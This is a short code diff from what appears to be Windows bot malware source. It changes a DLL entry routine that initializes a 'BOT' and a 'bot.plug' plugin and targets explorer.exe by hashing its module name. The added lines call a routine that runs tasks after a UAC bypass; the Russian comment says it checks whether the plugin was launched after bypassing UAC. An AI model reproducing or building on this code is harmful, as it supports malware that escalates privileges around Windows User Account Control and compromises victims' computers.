@@ -240,6 +240,11 @@ BOOL APIENTRY MyDllMain( HMODULE hModule,
 	{
 		case DLL_PROCESS_ATTACH:
 			BOT::Initialize(ProcessUnknown);
+#ifdef UAC_bypassH
+			//смотрим возможно ботплаг запустили после обхода UAC
+			if( ExecTaskAfterUAC() ) return TRUE;
+#endif //UAC_bypassH
+
 			pGetModuleFileNameA( NULL, buf, MAX_PATH );
 			DLLDBG( "MyDllMain", "Start bot.plug in process %s", buf );
 			if( File::GetNameHashA( buf, true ) == 0x490A0972 ) //стартуем если в процессе проводника (explorer.exe)
